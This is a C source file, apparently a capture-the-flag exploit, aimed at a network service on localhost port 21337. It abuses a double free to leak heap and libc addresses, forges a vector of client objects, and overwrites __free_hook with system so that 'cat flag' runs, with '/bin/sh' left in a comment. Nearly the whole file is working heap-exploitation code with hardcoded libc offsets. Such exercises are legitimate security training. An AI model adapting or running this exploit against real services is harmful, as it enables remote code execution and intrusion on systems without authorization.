#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <sys/select.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>
#include <stdio.h>
#include <arpa/inet.h>  
#include <string.h> 
#include <err.h>
#include <stdbool.h>

#include <signal.h>

#define PORT 21337

#define MAIN_ARENA_OFFSET	0x1e4ca0
#define __FREE_HOOK_OFFSET 	0x1e68e8
#define SYSTEM_OFFSET 		0x50300
#define PAYLOAD_LENGTH		0x400

char BUF_30[0x30];
char BUF_40[0x40];
char BUF_60[0x60];
char BUF_70[0x70];
char BUF_200[0x200];
char BUF_230[0x230];
char BUF_240[0x240];
char BUF_300[0x300];
char BUF_4C0[0x4c0];


void init() {
	memset(BUF_30, 0x41, sizeof(BUF_30));
	memset(BUF_40, 0x41, sizeof(BUF_40));
	memset(BUF_60, 0x0, sizeof(BUF_60));
	memset(BUF_70, 0x0, sizeof(BUF_70));
	memset(BUF_200, 0x0, sizeof(BUF_200));
	memset(BUF_230, 0x0, sizeof(BUF_230));
	memset(BUF_240, 0x0, sizeof(BUF_240));
	memset(BUF_300, 0x0, sizeof(BUF_300));
	memset(BUF_4C0, 0x41, sizeof(BUF_4C0));

	BUF_300[sizeof(BUF_300) - 1] = '\n';
	BUF_4C0[sizeof(BUF_4C0) - 1] = '\n';
}

void do_sleep() {
	usleep(2000);
}

void trace(const char *str) {
	printf("[*] %s\n", str);
	do_sleep();
}

char *get_faked_clients_vector(void *heap_ptr, void *ptr_to_unsorted_free, size_t *pLength) {
	size_t length = 0;
	long long *faked = (long long*)malloc(0x3000);
	long long *pFaked = faked;

	memset(faked, 0x0, 0x3000);
	//*pFaked = (long long)1<<32; ++pFaked;
	*pFaked = (long long)0x0; ++pFaked; length += sizeof(long long);
	*pFaked = (long long)heap_ptr; ++pFaked; length += sizeof(long long);
	for (size_t i = 0; i < 3; ++i) {
		*pFaked = 0x91; ++pFaked;
		length += sizeof(long long);
	}
	*pFaked = (long long)heap_ptr; ++pFaked; length += sizeof(long long);
	for (size_t i = 0; i < 3; ++i) {
		*pFaked = 0x91; ++pFaked;
		length += sizeof(long long);
	}

	*pFaked = (long long)((long long)1 << 32 | 4); ++pFaked; length += sizeof(long long);
	*pFaked = (long long)heap_ptr; ++pFaked; length += sizeof(long long);
	for (size_t i = 0; i < 3; ++i) {
		*pFaked = 0x91; ++pFaked;
		length += sizeof(long long);
	}
	*pFaked = (long long)ptr_to_unsorted_free; ++pFaked; length += sizeof(long long);
	*pFaked = 0xf0; ++pFaked; length += sizeof(long long);
	*pFaked = 0x800; ++pFaked; length += sizeof(long long);

	*pLength = length;
	return (char*)faked;
}

int getsocket() {
	struct sockaddr_in serv_addr;
	struct sockaddr_in addr;
	int sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd < 0) {
		err(1, "socket");
	}

	int flag = 1;
	if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &flag, sizeof(flag)) != 0) {
		err(1, "setsockopt");
	}

	struct timeval tv;
	tv.tv_sec = 1;
	tv.tv_usec = 0;
	if (setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv) ){
		err(1, "setsockopt");	
	}

	serv_addr.sin_family = AF_INET; 
    serv_addr.sin_port = htons(PORT); 
    if(inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr)<=0)  { 
        err(1, "inet_pton");
    } 

	if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
		err(1, "connect");
	}
	do_sleep();

	return sockfd;
}

void send_data(int sockfd, char *data, size_t length) {
	char *new_data = (char*)malloc(sizeof(char) * (length+1));
	if(!new_data) {
		err(1, "malloc");
	}

	memcpy(new_data, data, length);
	new_data[length] = '\n';
	send(sockfd, new_data, length+1, 0);

	free(new_data);
}

void send_recv_data(int sockfd, char *buf, size_t length) {
	char *recvbuf = (char*)malloc(sizeof(char)*(length+0x100));
	if(!recvbuf) {
		err(1, "malloc");
	}

	send_data(sockfd, buf, length);
	recv(sockfd, recvbuf, length + 0x100, 0);

	free(recvbuf);
}

void close_conn(int sockfd) {
	do_sleep();
	shutdown(sockfd, SHUT_RDWR);
	close(sockfd);
}

void* leak() {
	int conn[10] = { -1 };

	void *ptr;
	char recvbuf[0x100];
	memset(recvbuf, 0x0, sizeof(recvbuf));

	for (int i = 0; i < 3; ++i) {
		conn[i] = getsocket();
	}

	send_recv_data(conn[0], BUF_30, sizeof(BUF_30));
	send_recv_data(conn[1], BUF_60, sizeof(BUF_60));

	trace("trigger df: destruct first 2 clients, and double free lst[1]->wr_buf");
	do_sleep();
	close(conn[0]);
	sleep(2);
	close(conn[1]);
	send(conn[2], BUF_300, sizeof(BUF_300), 0);

	trace("trigger s1 alloaction, catch chunk with s1->rd_buf");
	conn[3] = getsocket();
	send(conn[3], BUF_70, sizeof(BUF_70), 0);

	trace("trigger s2 alloaction, catch same chunk with s2->rd_buf");
	conn[4] = getsocket();
	send_data(conn[4], BUF_70, sizeof(BUF_70));

	trace("free s2, set absolute pointer of tcache in s1->rd_buf");
	close_conn(conn[4]);

	trace("send 0x0a to s1, trigger write of s1->rd_buf");
	send(conn[3], "\n", 1, 0);
	recv(conn[3], recvbuf, sizeof(recvbuf), 0);

	ptr = *(char**)(recvbuf+11);

	trace("clean up");
	close_conn(conn[2]);
	close_conn(conn[3]);
	return ptr;
}

void* leak_libc(void *heap_ptr) {
	int conn[10] = { -1 };
	void *ptr;
	char recvbuf[0x100];

	memset(recvbuf, 0x0, sizeof(recvbuf));
	void *ptr_to_unsorted_free = (char*)(heap_ptr) + 0xe70;

	int unsorted_chunk = getsocket();
	send_recv_data(unsorted_chunk, BUF_4C0, sizeof(BUF_4C0));
	close_conn(unsorted_chunk);

	trace("add 3 connections");
	for (int i = 0; i < 3; ++i) {
		conn[i] = getsocket();
	}

	send_recv_data(conn[0], BUF_30, sizeof(BUF_30));
	send_recv_data(conn[1], BUF_230, sizeof(BUF_230));

	trace("trigger df: destruct first 2 clients, and double free lst[1]->wr_buf");
	do_sleep();
	close(conn[0]);
	sleep(2);
	close(conn[1]);
	send(conn[2], BUF_300, sizeof(BUF_300), 0);

	close_conn(conn[2]);

	int target = getsocket();
	send(target, BUF_40, sizeof(BUF_40), 0);

	trace("trigger s1 alloaction, catch chunk with s1->wr_buf");
	int s1 = getsocket();
	send_recv_data(s1, "hello", 5);
	send_recv_data(s1, BUF_240, sizeof(BUF_240));

	trace("trigger std::vector realloaction, catch chunk with client the vector's buffer");
	for (size_t i = 0; i < 5; ++i) {	
		conn[i] = getsocket();
	}

	trace("now, s1->wr_buf == std::vector. Corrupt target->rd_buf, set to");

	size_t length = 0;
	char *faked = get_faked_clients_vector(heap_ptr, ptr_to_unsorted_free, &length);

	send_data(s1, (char*)faked, length);
	recv(target, recvbuf, sizeof(recvbuf), 0);

	ptr = *(char**)(recvbuf);
	
	for (int i = 0; i < 5; ++i) {
		close_conn(conn[i]);
	}
	close_conn(s1);
	close_conn(target);

	free(faked);
	return ptr;
}


void trigger_system(long long *target_addr, void *content) {
	int conn[10] = { -1 };

	char *buf = (char*)malloc(sizeof(char) * sizeof(BUF_200));
	char *payload = (char*)malloc(sizeof(char) * PAYLOAD_LENGTH);
	char *pPayload;
	char recvbuf[0x100];

	memset(recvbuf, 0x0, sizeof(recvbuf));

	for (int i = 0; i < 3; ++i) {
		conn[i] = getsocket();
	}

	send_recv_data(conn[0], BUF_30, sizeof(BUF_30));
	send_recv_data(conn[1], BUF_200, sizeof(BUF_200));


	trace("corrupt next allocation, gain arbitrary write");
	do_sleep();
	close(conn[0]);
	sleep(2);
	close(conn[1]);
	send_data(conn[2], (char*)&target_addr, sizeof(void*));

	trace("prepare arbitrary malloc");
	memset(buf, 0x0, sizeof(BUF_200));
	memcpy(buf, &content, sizeof(void*));

	conn[3] = getsocket();
	send_recv_data(conn[3], "hello", 5);
	send_recv_data(conn[3], buf, sizeof(BUF_200));

	trace("trigger arbitrary_write: *(__free_hook_addr)=system_addr");
	memset(payload, 0x0, PAYLOAD_LENGTH);
	pPayload = payload;
	//memcpy(pPayload, "/bin/sh\x00", 8);
	memcpy(pPayload, "cat flag >&4\x00\x00\x00\x00", 16);
	pPayload += 0xe8;
	memcpy(pPayload, &content, sizeof(void*));
	pPayload += sizeof(void*);
	memset(pPayload, 0x43, PAYLOAD_LENGTH - 0x100);

	conn[4] = getsocket();
	send_recv_data(conn[4], "hello", 5);
	send_recv_data(conn[4], payload, PAYLOAD_LENGTH);

	trace("trigger __free_hook() on /bin/sh");
	close(conn[4]);

	recv(conn[3], recvbuf, sizeof(recvbuf), 0);
	printf("%s\n", recvbuf);
}

int main(void) {
	void *heap_ptr, *main_arena, *libc_base;
	void *free_hook_addr, *system_addr;

	heap_ptr = main_arena = libc_base = free_hook_addr = system_addr = NULL;
	init();

	heap_ptr = leak();	
	printf("[*] leaked heap ptr == %p\n", heap_ptr);


	main_arena = leak_libc(heap_ptr);	
	libc_base = main_arena - MAIN_ARENA_OFFSET;
	printf("[*] leaked libc base == %p\n", libc_base);

	free_hook_addr = libc_base + __FREE_HOOK_OFFSET;
	system_addr = libc_base + SYSTEM_OFFSET;

	printf("[*] __free_hook_addr == %p\n", free_hook_addr);
	printf("[*] system_addr == %p\n", system_addr);

	trigger_system(free_hook_addr, system_addr);

	printf("[*] done\n");
	getchar();
	return 0;
}